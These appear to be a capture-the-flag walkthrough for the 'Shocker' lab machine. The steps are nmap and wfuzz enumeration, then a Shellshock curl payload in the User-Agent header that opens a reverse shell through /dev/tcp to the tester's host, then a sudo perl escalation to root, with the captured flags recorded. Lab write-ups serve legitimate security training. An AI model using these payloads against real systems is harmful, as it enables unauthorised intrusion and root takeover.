# Shocker

furious 10.10.10.56

nmap -sC -sV -p80,2222 10.10.10.56 -Pn -n -oN targeted

wfuzz -c --hc 404 -t 100 -w /usr/share/dirb/wordlists/common.txt http://10.10.10.56/FUZZ

cgi-bin/

wfuzz -c --hc 404 -t 100 -w /usr/share/dirb/wordlists/common.txt -w extensions.txt http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z

curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'" http://10.10.10.56/cgi-bin/user.sh
sudo nc -lvp 443

# full tty
```bash
script /dev/null -c bash
# ctrl + z
stty -a
stty raw -echo
fg # it doesn't show on the screen
reset
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
```

cat /home/shelly/user.txt

2ec24e11320026d1e70ff3e16695b233

## root

shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
# whoami
root
# cat /root/root.txt

52c2715605d70c7619030560dc1ca467
